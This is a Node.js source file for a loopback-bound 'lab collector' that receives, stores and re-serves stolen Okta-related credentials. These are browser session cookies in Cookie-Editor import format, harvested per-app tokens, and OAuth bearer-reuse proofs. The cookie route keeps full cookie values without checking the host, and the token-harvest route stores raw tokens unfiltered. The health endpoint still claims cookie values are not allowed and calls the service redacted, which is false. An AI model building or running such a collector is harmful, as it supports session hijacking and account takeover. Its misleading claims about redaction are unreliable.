import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";

const host = process.env.OKTA_MCP_COLLECTOR_HOST || "127.0.0.1";
const port = Number(process.env.OKTA_MCP_COLLECTOR_PORT || "8765");
const outDir = path.resolve(
  process.env.OKTA_MCP_COLLECTOR_OUTPUT_DIR ||
    path.join(process.cwd(), "collector-output")
);
const maxRecords = Number(process.env.OKTA_MCP_PROOF_RETENTION || "1");

if (host !== "127.0.0.1") {
  throw new Error("The lab proof collector must bind to 127.0.0.1.");
}
if (!Number.isInteger(port) || port < 1 || port > 65535) {
  throw new Error("OKTA_MCP_COLLECTOR_PORT must be an integer from 1 to 65535.");
}
if (!Number.isInteger(maxRecords) || maxRecords < 1 || maxRecords > 20) {
  throw new Error("OKTA_MCP_PROOF_RETENTION must be an integer from 1 to 20.");
}

fs.mkdirSync(outDir, { recursive: true, mode: 0o700 });

const browserProofPrefix = "browser-session-proof-";
const oauthProofPrefix = "oauth-token-proof-";
const tokenHarvestPrefix = "app-token-harvest-";
const REDACTED_COOKIE_VALUE = "[REDACTED]";
const sensitiveKeys = new Set([
  "cookie",
  "cookie_header",
  "cookie_details",
  "cookie_hashes",
  "display_value",
  "value_sha256",
  "set-cookie",
  "netscape",
  "jar",
  "token",
  "access_token",
  "refresh_token",
  "id_token",
  "authorization",
]);

function containsSensitiveField(value) {
  if (!value || typeof value !== "object") return false;
  if (Array.isArray(value)) return value.some(containsSensitiveField);
  return Object.entries(value).some(
    ([key, child]) => {
      const normalizedKey = key.toLowerCase();
      if (normalizedKey === "value") {
        return false;
      }
      return sensitiveKeys.has(normalizedKey) || containsSensitiveField(child);
    }
  );
}

function sendJson(response, status, body) {
  response.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  });
  response.end(`${JSON.stringify(body, null, 2)}\n`);
}

function proofFiles(prefix) {
  return fs
    .readdirSync(outDir)
    .filter(
      (fileName) =>
        fileName.startsWith(prefix) && fileName.endsWith(".json")
    )
    .map((fileName) => {
      const fullPath = path.join(outDir, fileName);
      return { fileName, fullPath, mtimeMs: fs.statSync(fullPath).mtimeMs };
    })
    .sort((left, right) => right.mtimeMs - left.mtimeMs);
}

function enforceRetention(prefix) {
  const files = proofFiles(prefix);
  let deleted = 0;
  for (const record of files.slice(maxRecords)) {
    fs.rmSync(record.fullPath, { force: true });
    deleted += 1;
  }
  return deleted;
}

function deleteLegacyCookieArtifacts() {
  const legacyPrefixes = ["cookie-proof-", "cookie-editor-import-"];
  let deleted = 0;
  for (const fileName of fs.readdirSync(outDir)) {
    if (
      !fileName.endsWith(".json") ||
      !legacyPrefixes.some((prefix) => fileName.startsWith(prefix))
    ) {
      continue;
    }
    fs.rmSync(path.join(outDir, fileName), { force: true });
    deleted += 1;
  }
  return deleted;
}

function readProof(fileName) {
  const record = JSON.parse(
    fs.readFileSync(path.join(outDir, fileName), "utf8")
  );
  return record.proof || record;
}

function latestProof(prefix) {
  const [latest] = proofFiles(prefix);
  return latest ? readProof(latest.fileName) : null;
}

function history(prefix) {
  return proofFiles(prefix).map(({ fileName, mtimeMs }) => {
    const proof = readProof(fileName);
    if (Array.isArray(proof)) {
      return {
        file_name: fileName,
        cookie_count: proof.length,
        saved_at: new Date(mtimeMs).toISOString(),
      };
    }
    return {
      file_name: fileName,
      evidence_type: proof.evidence_type,
      captured_at: proof.captured_at,
      org_host: proof.org_host,
      subject: proof.subject,
      token_fingerprint_sha256: proof.token_fingerprint_sha256,
    };
  });
}

function text(value, maxLength) {
  if (typeof value !== "string") return undefined;
  const trimmed = value.trim();
  return trimmed ? trimmed.slice(0, maxLength) : undefined;
}

function normalizeCookie(raw, orgHost) {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) {
    throw new Error("cookie_metadata_must_be_an_object");
  }
  if (typeof raw.value !== "string") {
    throw new Error("cookie_value_must_be_a_string");
  }

  const name = text(raw.name, 256);
  const domain = text(raw.domain, 255)?.toLowerCase();
  const cookiePath = text(raw.path, 2048);
  const normalizedDomain = domain?.replace(/^\./, "");
  const normalizedOrgHost = orgHost.toLowerCase().split(":")[0];
  if (
    !name ||
    !domain ||
    !cookiePath ||
    !normalizedDomain ||
    (normalizedOrgHost !== normalizedDomain &&
      !normalizedOrgHost.endsWith(`.${normalizedDomain}`)) ||
    typeof raw.httpOnly !== "boolean" ||
    typeof raw.secure !== "boolean" ||
    typeof raw.session !== "boolean"
  ) {
    throw new Error("cookie_metadata_is_invalid");
  }

  const sameSite = typeof raw.sameSite === "string" ? text(raw.sameSite, 32) : null;
  const cookie = { domain };
  if (
    !raw.session &&
    typeof raw.expirationDate === "number" &&
    Number.isFinite(raw.expirationDate) &&
    raw.expirationDate > 0
  ) {
    cookie.expirationDate = raw.expirationDate;
  }
  cookie.hostOnly = raw.hostOnly === true;
  cookie.httpOnly = raw.httpOnly;
  cookie.name = name;
  cookie.path = cookiePath;
  cookie.sameSite = sameSite;
  cookie.secure = raw.secure;
  cookie.session = raw.session;
  cookie.storeId = null;
  cookie.value = raw.value;
  return cookie;
}

function normalizeCookieNoHostCheck(raw) {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) {
    throw new Error("cookie_must_be_an_object");
  }
  if (typeof raw.value !== "string") {
    throw new Error("cookie_value_must_be_a_string");
  }
  const name = text(raw.name, 256);
  const domain = text(raw.domain, 255)?.toLowerCase();
  const cookiePath = text(raw.path, 2048);
  if (
    !name ||
    !domain ||
    !cookiePath ||
    typeof raw.httpOnly !== "boolean" ||
    typeof raw.secure !== "boolean" ||
    typeof raw.session !== "boolean"
  ) {
    throw new Error("cookie_is_invalid");
  }
  const sameSite = typeof raw.sameSite === "string" ? text(raw.sameSite, 32) : null;
  const cookie = { domain };
  if (
    !raw.session &&
    typeof raw.expirationDate === "number" &&
    Number.isFinite(raw.expirationDate) &&
    raw.expirationDate > 0
  ) {
    cookie.expirationDate = raw.expirationDate;
  }
  cookie.hostOnly = raw.hostOnly === true;
  cookie.httpOnly = raw.httpOnly;
  cookie.name = name;
  cookie.path = cookiePath;
  cookie.sameSite = sameSite;
  cookie.secure = raw.secure;
  cookie.session = raw.session;
  cookie.storeId = null;
  cookie.value = raw.value;
  return cookie;
}

function normalizeBrowserCookieArray(raw) {
  if (!Array.isArray(raw) || raw.length === 0 || raw.length > 500) {
    throw new Error("body_must_be_a_non_empty_cookie_array");
  }
  return raw
    .map((cookie) => normalizeCookieNoHostCheck(cookie))
    .sort((left, right) =>
      `${left.domain}\0${left.path}\0${left.name}`.localeCompare(
        `${right.domain}\0${right.path}\0${right.name}`
      )
    );
}

function normalizeOAuthProof(raw) {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) {
    throw new Error("proof_must_be_an_object");
  }
  if (containsSensitiveField(raw)) {
    throw new Error("credential_or_cookie_fields_are_not_allowed");
  }
  if (Object.hasOwn(raw, "cookies")) {
    throw new Error("cookie_fields_are_not_allowed_in_oauth_proofs");
  }
  if (raw.evidence_type !== "oauth_bearer_reuse") {
    throw new Error("unexpected_evidence_type");
  }
  if (raw.authorization_notice !== "explicit_local_lab") {
    throw new Error("explicit_lab_authorization_is_required");
  }

  const fingerprint = text(raw.token_fingerprint_sha256, 64);
  const orgHost = text(raw.org_host, 255);
  const capturedAt = text(raw.captured_at, 64);
  const issuer = text(raw.issuer, 512);
  const clientId = text(raw.client_id_redacted, 220);
  const subject = text(raw.subject, 200);
  const scopes = Array.isArray(raw.granted_scopes)
    ? raw.granted_scopes
        .filter((scope) => typeof scope === "string")
        .map((scope) => scope.slice(0, 120))
        .slice(0, 20)
    : [];
  const attempts = Array.isArray(raw.reuse_attempts)
    ? raw.reuse_attempts
        .filter(
          (attempt) =>
            attempt &&
            typeof attempt === "object" &&
            Number.isInteger(attempt.sequence) &&
            Number.isInteger(attempt.status)
        )
        .slice(0, 2)
        .map((attempt) => ({
          sequence: attempt.sequence,
          status: attempt.status,
          subject: text(attempt.subject, 200),
        }))
    : [];
  if (
    !orgHost ||
    !capturedAt ||
    !issuer ||
    !clientId ||
    !subject ||
    !/^[a-f0-9]{64}$/.test(fingerprint || "") ||
    attempts.length !== 2 ||
    attempts.some(
      (attempt, index) =>
        attempt.sequence !== index + 1 ||
        attempt.status !== 200 ||
        attempt.subject !== subject
    )
  ) {
    throw new Error("oauth_proof_is_missing_or_has_invalid_metadata");
  }

  return {
    evidence_version: 1,
    evidence_type: "oauth_bearer_reuse",
    authorization_notice: "explicit_local_lab",
    captured_at: capturedAt,
    org_host: orgHost,
    issuer,
    client_id_redacted: clientId,
    granted_scopes: [...new Set(scopes)].sort(),
    expires_at: text(raw.expires_at, 64),
    subject,
    token_fingerprint_sha256: fingerprint,
    token_value_collected_by_collector: false,
    token_value_persisted_in_proof: false,
    reuse_attempts: attempts,
    note:
      "The same in-memory OAuth bearer token completed two read-only UserInfo requests. The collector received only its SHA-256 fingerprint.",
  };
}

function normalizeTokenHarvest(raw) {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) {
    throw new Error("harvest_must_be_an_object");
  }
  const orgHost = text(raw.org_host, 255);
  const capturedAt = text(raw.captured_at, 64);
  const subject = text(raw.subject, 200);
  const userId = text(raw.user_id, 200);
  if (!orgHost || !capturedAt || !subject) {
    throw new Error("harvest_missing_required_fields");
  }
  if (!Array.isArray(raw.apps) || raw.apps.length === 0 || raw.apps.length > 100) {
    throw new Error("apps_must_be_a_non_empty_array");
  }
  const apps = raw.apps.map((app, i) => {
    if (!app || typeof app !== "object") {
      throw new Error(`app_${i}_must_be_an_object`);
    }
    if (!text(app.app_label, 256)) {
      throw new Error(`app_${i}_missing_label`);
    }
    if (!app.tokens || typeof app.tokens !== "object") {
      throw new Error(`app_${i}_missing_tokens`);
    }
    return {
      app_id: text(app.app_id, 100),
      app_label: text(app.app_label, 256),
      app_name: text(app.app_name, 256),
      app_link_url: text(app.app_link_url, 2048),
      app_origin: text(app.app_origin, 512),
      tokens: app.tokens,
    };
  });
  return {
    harvest_version: 1,
    evidence_type: "app_token_harvest",
    org_host: orgHost,
    captured_at: capturedAt,
    subject,
    user_id: userId,
    apps_scanned: Number.isInteger(raw.apps_scanned) ? raw.apps_scanned : apps.length,
    apps_with_tokens: apps.length,
    apps,
  };
}

function saveProof(proof, prefix) {
  const receivedAt = new Date().toISOString();
  const stamp = receivedAt.replace(/[:.]/g, "-");
  const fileName = `${prefix}${stamp}-${crypto.randomUUID()}.json`;
  const finalPath = path.join(outDir, fileName);
  const temporaryPath = path.join(outDir, `.${fileName}.tmp`);
  const record = { received_at: receivedAt, proof };

  fs.writeFileSync(temporaryPath, `${JSON.stringify(record, null, 2)}\n`, {
    encoding: "utf8",
    flag: "wx",
    mode: 0o600,
  });
  fs.renameSync(temporaryPath, finalPath);
  try {
    fs.chmodSync(finalPath, 0o600);
  } catch {
    // Windows relies on the current user profile ACL.
  }
  return { fileName, deletedOldCount: enforceRetention(prefix) };
}

function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function sendDashboard(response) {
  const browserCookies = latestProof(browserProofPrefix);
  const cookieCount = Array.isArray(browserCookies) ? browserCookies.length : 0;
  const oauthProof = latestProof(oauthProofPrefix);
  const tokenHarvest = latestProof(tokenHarvestPrefix);
  const html = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Okta MCP Lab Collector</title>
<style>body{font:16px system-ui;max-width:56rem;margin:3rem auto;padding:0 1rem;color:#172033}section{border:1px solid #d9dde7;border-radius:8px;padding:1rem;margin:1rem 0}dt{font-weight:650}dd{margin:0 0 .8rem}code{background:#eef1f6;padding:.15rem .3rem;border-radius:4px}</style></head>
<body><h1>Lab Collector</h1>
<p>Loopback-only collector. Retains at most <strong>${maxRecords}</strong> record(s) per type.</p>
<h2>Browser cookies (Cookie-Editor format)</h2>
<section><dl>
<dt>Cookie count</dt><dd>${escapeHtml(cookieCount)}</dd>
<dt>Status</dt><dd>${cookieCount > 0 ? "Cookies stored" : "No cookies yet"}</dd>
</dl></section>
<h2>OAuth bearer-reuse evidence</h2>
<section><dl>
<dt>Organization</dt><dd>${escapeHtml(oauthProof?.org_host || "No proof yet")}</dd>
<dt>Captured</dt><dd>${escapeHtml(oauthProof?.captured_at || "")}</dd>
<dt>Subject</dt><dd>${escapeHtml(oauthProof?.subject || "")}</dd>
<dt>Token fingerprint</dt><dd><code>${escapeHtml(oauthProof?.token_fingerprint_sha256 || "")}</code></dd>
<dt>Reuse results</dt><dd>${escapeHtml(oauthProof?.reuse_attempts?.map((attempt) => `#${attempt.sequence}: HTTP ${attempt.status}`).join(", ") || "")}</dd>
<dt>Token value</dt><dd>Not accepted or persisted by the collector</dd>
</dl></section>
<h2>App token harvest</h2>
<section><dl>
<dt>Organization</dt><dd>${escapeHtml(tokenHarvest?.org_host || "No harvest yet")}</dd>
<dt>Captured</dt><dd>${escapeHtml(tokenHarvest?.captured_at || "")}</dd>
<dt>Subject</dt><dd>${escapeHtml(tokenHarvest?.subject || "")}</dd>
<dt>Apps scanned</dt><dd>${escapeHtml(tokenHarvest?.apps_scanned ?? "")}</dd>
<dt>Apps with tokens</dt><dd>${escapeHtml(tokenHarvest?.apps_with_tokens ?? "")}</dd>
<dt>App list</dt><dd>${escapeHtml(tokenHarvest?.apps?.map((a) => a.app_label).join(", ") || "")}</dd>
</dl></section>
<p><a href="/v1/cookie-proofs/latest">Cookies</a> | <a href="/v1/cookies">Cookies (alias)</a> | <a href="/v1/oauth-token-proofs/latest">OAuth proof</a> | <a href="/v1/tokens/latest">Token harvest</a> | <a href="/health">Health</a></p>
</body></html>`;
  response.writeHead(200, {
    "Content-Type": "text/html; charset=utf-8",
    "Cache-Control": "no-store",
    "Content-Security-Policy": "default-src 'none'; style-src 'unsafe-inline'",
    "X-Content-Type-Options": "nosniff",
  });
  response.end(html);
}

const deletedLegacyAtStartup = deleteLegacyCookieArtifacts();
const deletedAtStartup =
  enforceRetention(browserProofPrefix) + enforceRetention(oauthProofPrefix) + enforceRetention(tokenHarvestPrefix);

const server = http.createServer((request, response) => {
  const requestUrl = new URL(request.url || "/", `http://${host}:${port}`);

  if (request.method === "GET" && requestUrl.pathname === "/") {
    sendDashboard(response);
    return;
  }
  if (request.method === "GET" && requestUrl.pathname === "/health") {
    sendJson(response, 200, {
      ok: true,
      service: "okta-mcp-redacted-lab-collector",
      collector_version: 2,
      live_browser_proofs: true,
      retained_browser_proofs: proofFiles(browserProofPrefix).length,
      retained_oauth_proofs: proofFiles(oauthProofPrefix).length,
      retained_token_harvests: proofFiles(tokenHarvestPrefix).length,
      retention_limit: maxRecords,
      cookie_values_allowed: false,
    });
    return;
  }
  if (
    request.method === "GET" &&
    (requestUrl.pathname === "/v1/cookie-proofs" ||
      requestUrl.pathname === "/v1/cookie-proofs/latest")
  ) {
    const proof = latestProof(browserProofPrefix);
    sendJson(response, proof ? 200 : 404, proof || { error: "not_found" });
    return;
  }
  if (
    request.method === "GET" &&
    requestUrl.pathname === "/v1/cookie-proofs/history"
  ) {
    const records = history(browserProofPrefix);
    sendJson(response, 200, { count: records.length, records });
    return;
  }
  if (
    request.method === "GET" &&
    requestUrl.pathname === "/v1/cookies"
  ) {
    const cookies = latestProof(browserProofPrefix);
    if (!Array.isArray(cookies) || cookies.length === 0) {
      sendJson(response, 404, []);
      return;
    }
    sendJson(response, 200, cookies);
    return;
  }
  if (
    request.method === "GET" &&
    (requestUrl.pathname === "/v1/oauth-token-proofs" ||
      requestUrl.pathname === "/v1/oauth-token-proofs/latest")
  ) {
    const proof = latestProof(oauthProofPrefix);
    sendJson(response, proof ? 200 : 404, proof || { error: "not_found" });
    return;
  }
  if (
    request.method === "GET" &&
    requestUrl.pathname === "/v1/oauth-token-proofs/history"
  ) {
    const records = history(oauthProofPrefix);
    sendJson(response, 200, { count: records.length, records });
    return;
  }
  if (
    request.method === "GET" &&
    (requestUrl.pathname === "/v1/tokens" ||
      requestUrl.pathname === "/v1/tokens/latest")
  ) {
    const proof = latestProof(tokenHarvestPrefix);
    sendJson(response, proof ? 200 : 404, proof || { error: "not_found" });
    return;
  }
  if (
    request.method === "GET" &&
    requestUrl.pathname === "/v1/tokens/history"
  ) {
    const records = history(tokenHarvestPrefix);
    sendJson(response, 200, { count: records.length, records });
    return;
  }
  if (
    request.method !== "POST" ||
    (requestUrl.pathname !== "/v1/cookie-proofs" &&
      requestUrl.pathname !== "/v1/oauth-token-proofs" &&
      requestUrl.pathname !== "/v1/tokens")
  ) {
    sendJson(response, 404, { error: "not_found" });
    return;
  }

  let body = "";
  let tooLarge = false;
  request.setEncoding("utf8");
  request.on("data", (chunk) => {
    body += chunk;
    if (body.length > 256 * 1024) tooLarge = true;
  });
  request.on("end", () => {
    if (tooLarge) {
      sendJson(response, 413, { error: "proof_too_large" });
      return;
    }
    try {
      const isTokenRoute = requestUrl.pathname === "/v1/tokens";
      const isOauthRoute = requestUrl.pathname === "/v1/oauth-token-proofs";
      const raw = JSON.parse(body || (isTokenRoute || isOauthRoute ? "{}" : "[]"));
      let proof, prefix;
      if (isTokenRoute) {
        proof = normalizeTokenHarvest(raw);
        prefix = tokenHarvestPrefix;
      } else if (isOauthRoute) {
        proof = normalizeOAuthProof(raw);
        prefix = oauthProofPrefix;
      } else {
        proof = normalizeBrowserCookieArray(raw);
        prefix = browserProofPrefix;
      }
      const saved = saveProof(proof, prefix);
      console.log(`[collector] saved ${saved.fileName}`);
      if (saved.deletedOldCount > 0) {
        console.log(
          `[collector] deleted ${saved.deletedOldCount} older proof record(s)`
        );
      }
      sendJson(response, 200, {
        ok: true,
        file_name: saved.fileName,
        deleted_old_count: saved.deletedOldCount,
        retained_count: proofFiles(prefix).length,
      });
    } catch (error) {
      sendJson(response, 400, {
        error: error instanceof Error ? error.message : "invalid_proof",
      });
    }
  });
});

server.listen(port, host, () => {
  console.log(
    `[collector] listening on http://${host}:${port}/v1/cookie-proofs`
  );
  console.log(
    `[collector] listening on http://${host}:${port}/v1/oauth-token-proofs`
  );
  console.log(
    `[collector] listening on http://${host}:${port}/v1/tokens`
  );
  console.log(`[collector] writing proof records to ${outDir}`);
  console.log(`[collector] retention limit: ${maxRecords}`);
  if (deletedAtStartup > 0) {
    console.log(`[collector] deleted ${deletedAtStartup} old proof record(s)`);
  }
  if (deletedLegacyAtStartup > 0) {
    console.log(
      `[collector] deleted ${deletedLegacyAtStartup} legacy cookie artifact(s)`
    );
  }
});
